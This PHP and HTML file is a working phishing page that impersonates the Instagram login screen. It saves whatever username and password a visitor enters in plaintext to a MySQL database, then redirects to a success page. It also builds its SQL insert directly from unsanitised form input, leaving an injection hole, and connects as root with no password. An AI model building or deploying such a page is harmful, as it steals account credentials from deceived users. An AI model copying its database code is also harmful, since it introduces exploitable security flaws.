<?php
// Connect to the database
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "instagram";

$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Get the email and password from the form
if($_SERVER['REQUEST_METHOD'] == "POST")
	{
		//something was posted
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(!empty($username) && !empty($password))
		{

			
			$query = "insert into users (email,password) values ('$username','$password')";

			mysqli_query($conn, $query);

			header("Location: succes.html");
			die;
		}else
		{
			echo "Please enter some valid information!";
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
	<title>Instagram Login</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="icon" href="instagram-logo.png">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
	<header>
		<img src="instagram-logo.png" alt="Instagram Logo">
	</header>
	<main>
		<form method="post" >
			<label for="username">Phone number, username, or email</label>
			<input type="text" name="username" id="username" required>
			<label for="password">Password</label>
			<input type="password" name="password" id="password" required>
			<button type="submit" name="submit">Log In</button>
		</form>
		<a href="#">Forgot password?</a>
	</main>
</body>
</html>

